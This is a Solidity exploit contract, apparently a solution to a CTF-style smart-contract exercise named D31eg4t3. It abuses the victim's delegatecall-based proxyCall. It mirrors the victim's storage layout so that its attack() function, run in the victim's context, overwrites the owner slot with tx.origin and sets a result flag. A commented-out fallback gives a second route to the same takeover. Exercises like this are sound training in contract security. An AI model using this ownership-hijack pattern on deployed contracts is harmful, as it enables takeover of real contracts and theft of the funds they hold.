// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {console} from "forge-std/Test.sol";
interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;

}

contract Attack {
    address internal immutable victim;
    // TODO: Declare some variable here
    // Note: Checkout the storage layout in victim contract

    // Declare storage layout in the same order with victim contract
    uint256 var0 = 12345;
    uint8 var1 = 32;
    string private var2;
    address private var3;
    uint8 private var4;
    address public owner;
    mapping(address => bool) public result;


    constructor(address addr) payable {
        victim = addr;
    }

    // NOTE: You might need some malicious function here
    function attack() external{
        // change the owner of victim to hacker 
        owner = tx.origin;
        result[tx.origin] = true;   
    }

    function exploit() external {
        // TODO: Add your implementation here
        // Note: Make sure you know how delegatecall works
        // bytes memory data = ...
        
        // console.log("victim:",victim);
        // console.log("msg.sender",msg.sender);
        
        // Structure: D31eg4t3Test -> Attack -> D31eg4t3
        // D31eg4t3 is the victim

        // attempt 1: proxy pattern
        bytes memory data = abi.encodeWithSignature("attack()");
        ID31eg4t3(victim).proxyCall(data);
        

        // attempt 2: fallback pattern (create fallback function with the same code as attack())
        // bytes memory data = abi.encodeWithSignature("changeResult()");
        // ID31eg4t3(victim).proxyCall(data);

    }

    // fallback () external {
    //     // console.log("Enter fallback", msg.sender, tx.origin);
        
    //     owner = tx.origin;
    //     result[tx.origin] = true;        
    // }
    
}
